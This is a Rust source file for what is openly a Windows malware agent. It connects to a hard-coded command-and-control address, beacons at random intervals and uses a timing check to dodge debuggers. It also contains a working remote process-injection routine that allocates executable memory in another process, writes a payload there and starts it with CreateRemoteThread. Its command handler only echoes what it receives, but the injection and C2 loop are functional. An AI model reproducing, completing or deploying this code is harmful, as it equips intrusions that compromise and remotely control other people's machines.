use std::net::TcpStream;
use std::io::{Read, Write};
use std::time::Duration;
use rand::Rng;
use std::sync::atomic::AtomicBool;
use std::time::SystemTime;
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE};
use winapi::um::handleapi::CloseHandle;
use std::ptr;

const C2_ADDRESS: &str = "192.168.1.117:2222";
static IS_DEBUGGED: AtomicBool = AtomicBool::new(false);

fn check_for_debugging() -> bool {
    let start = SystemTime::now();
    for _ in 0..1_000_000 {
        let _ = 2 * 2;
    }
    start.elapsed().unwrap() > Duration::from_millis(1)
}

fn connect_to_c2() -> Result<TcpStream, std::io::Error> {
    let stream = TcpStream::connect(C2_ADDRESS)?;
    stream.set_read_timeout(Some(Duration::from_secs(10)))?;
    Ok(stream)
}

fn send_receive_commands(mut stream: TcpStream) -> Result<(), std::io::Error> {
    let mut buffer = [0; 512];

    // Send initial message to C2
    stream.write(b"Agent connected\n")?;

    loop {
        match stream.read(&mut buffer) {
            Ok(size) => {
                if size == 0 {
                    eprintln!("Connection closed by server");
                    return Ok(());
                }

                let command = String::from_utf8_lossy(&buffer[..size]);
                println!("Received command: {}", command);

                // Execute command and send response
                let response = execute_command(&command);
                stream.write(response.as_bytes())?;
            }
            Err(e) => {
                eprintln!("Failed to receive command: {}", e);
                break;
            }
        }
    }

    Ok(())
}

fn execute_command(command: &str) -> String {
    // For now, just echo the command received
    format!("Executed: {}\n", command)
}

fn inject_payload(target_pid: u32, payload: &[u8]) -> Result<(), std::io::Error> {
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid) };
    if process_handle.is_null() {
        return Err(std::io::Error::last_os_error());
    }

    let remote_memory = unsafe { 
        VirtualAllocEx(process_handle, ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) 
    };
    if remote_memory.is_null() {
        unsafe { VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE); }
        return Err(std::io::Error::last_os_error());
    }

    let result = unsafe { 
        WriteProcessMemory(process_handle, remote_memory, payload.as_ptr() as _, payload.len(), ptr::null_mut()) 
    };
    if result == 0 {
        unsafe { VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE); }
        return Err(std::io::Error::last_os_error());
    }

    unsafe {
        let thread_handle = winapi::um::processthreadsapi::CreateRemoteThread(
            process_handle, 
            ptr::null_mut(), 
            0, 
            Some(std::mem::transmute(remote_memory)), 
            ptr::null_mut(), 
            0, 
            ptr::null_mut()
        );
        if thread_handle.is_null() {
            return Err(std::io::Error::last_os_error());
        }
        CloseHandle(thread_handle);
    }
    
    Ok(())
}

fn random_delay() {
    let delay = rand::thread_rng().gen_range(1000..5000);
    std::thread::sleep(Duration::from_millis(delay));
}

fn main() {
    loop {
        if !check_for_debugging() {
            match connect_to_c2() {
                Ok(stream) => {
                    if let Err(e) = send_receive_commands(stream) {
                        eprintln!("Failed to communicate with C2: {}", e);
                    }
                }
                Err(e) => eprintln!("Failed to connect to C2: {}", e),
            }
            random_delay();
        }
    }
}

